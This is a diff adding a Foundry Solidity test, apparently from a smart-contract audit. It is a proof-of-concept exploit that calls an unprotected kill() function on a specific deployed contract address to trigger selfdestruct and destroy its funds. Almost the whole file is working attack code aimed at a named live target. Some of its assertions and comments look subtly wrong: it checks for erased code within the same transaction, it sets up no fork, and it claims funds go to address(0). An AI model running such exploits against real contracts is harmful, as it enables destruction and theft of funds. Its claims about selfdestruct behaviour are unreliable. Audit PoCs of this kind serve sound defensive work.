@@ -1,0 +1,51 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Test, console} from "forge-std/Test.sol";
+
+/**
+ * Exploit PoC for Finding #5: Unprotected SELFDESTRUCT instruction
+ * 
+ * The deployed JizzJet contract (0xf2a7429641d1b49a13dcb7e23b67a1a5101231f2) 
+ * contains a publicly callable function `kill()` that triggers selfdestruct,
+ * allowing any address to destroy the contract and lock all funds.
+ * This violates CWE-284 (Improper Access Control).
+ */
+contract ExploitTest is Test {
+    address constant TARGET = 0xf2a7429641d1b49a13dcb7e23b67a1a5101231f2;
+    // Expected selector for `kill()` = keccak256("kill()")[0:4]
+    bytes4 constant KILL_SELECTOR = 0x41c0e1b5;
+
+    function setUp() public {
+        vm.label(TARGET, "JizzJet");
+    }
+
+    function testUnprotectedSelfdestruct() public {
+        // Ensure target has code initially
+        uint256 codeSize;
+        assembly {
+            codeSize := extcodesize(TARGET)
+        }
+        assertGt(codeSize, 0, "Target should have code before exploit");
+
+        // Fund contract with some ETH to demonstrate loss
+        vm.deal(TARGET, 1 ether);
+        assertEq(address(TARGET).balance, 1 ether);
+
+        // Exploit: any user can call kill()
+        vm.prank(address(0xdead));
+        (bool success, ) = TARGET.call(abi.encodeWithSelector(KILL_SELECTOR));
+        require(success, "kill() call failed");
+
+        // Verify contract was destroyed
+        assembly {
+            codeSize := extcodesize(TARGET)
+        }
+        assertEq(codeSize, 0, "Target should have no code after selfdestruct");
+
+        // ETH balance of target is now 0 (selfdestruct sends to address(0) in typical implementation)
+        assertEq(address(TARGET).balance, 0, "ETH should have been burned or transferred away");
+    }
+}
+```
